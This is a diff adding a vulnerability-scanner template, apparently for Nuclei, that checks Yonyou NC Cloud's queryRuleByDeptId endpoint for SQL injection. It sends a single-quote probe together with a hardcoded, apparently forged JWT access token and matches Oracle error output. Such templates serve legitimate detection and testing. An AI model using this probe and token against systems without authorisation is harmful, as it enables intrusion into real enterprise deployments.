@@ -1,0 +1,22 @@
+id: yonyou-nc-cloud-queryRuleByDeptId-sqli
+
+info:
+  name: yonyou-nc-cloud-queryRuleByDeptId-sqli
+  author: yonyou-nc-cloud-queryRuleByDeptId-sqli
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /ncchr/attendcalendar/queryRuleByDeptId?orgId=1' HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"ORA-","SQL") && status_code==400
+          
